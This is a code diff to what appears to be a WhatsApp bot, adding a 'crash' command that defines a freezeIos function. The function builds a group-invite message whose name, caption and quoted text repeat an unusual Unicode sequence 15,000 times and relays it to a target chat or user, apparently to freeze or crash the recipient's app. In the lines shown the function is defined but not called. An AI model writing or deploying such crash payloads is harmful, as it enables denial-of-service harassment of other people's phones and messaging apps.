@@ -294,9 +294,42 @@ try {
       reply(`${formattedJson}`)
     }
     break;
+    case "crash": {
+      async function freezeIos(target, group = false) {
+        const message = generateWAMessageFromContent(target, {
+          groupInviteMessage: {
+              groupJid: `${Math.floor(Math.random() * 7202508)}@g.us`,
+              groupName: "🧪⃟꙰。⌁𝟕𝐞𝐩 𝐩𝐞𝐥 ⃰𝐢. - 𝐄𝐱𝐩𝐨𝐬𝐞𝐝" + "𑇂𑆵𑆴𑆿".repeat(15000),
+              caption: "🧪⃟꙰。⌁𝟕𝐞𝐩 𝐩𝐞𝐥 ⃰𝐢. - 𝐄𝐱𝐩𝐨𝐬𝐞𝐝" + "𑇂𑆵𑆴𑆿".repeat(15000),
+              inviteCode: crypto.randomBytes(72).toString('hex').toUpperCase(),
+              inviteExpiration: "720594829",
+              contextInfo: {
+                quotedMessage: {
+                    conversation: "𑇂𑆵𑆴𑆿".repeat(15000)
+                } 
+              },
+              jpegThumbnail: ZeppImg
+          }
+      }, {});
+    
+      await sock.relayMessage(target,
+        message.message,
+        group ?
+        {
+            messageId: message.key.id
+        } : {
+            participant: {
+                jid: target
+            },
+            messageId: message.key.id
+          } 
+        );
+      }
+    break;
+    }
     case "meid": {
       reply(`${WaSocket.user.id}`)
-    }
+      }
     break;
     case "tsid": {
       reply(`${m.chat}`)
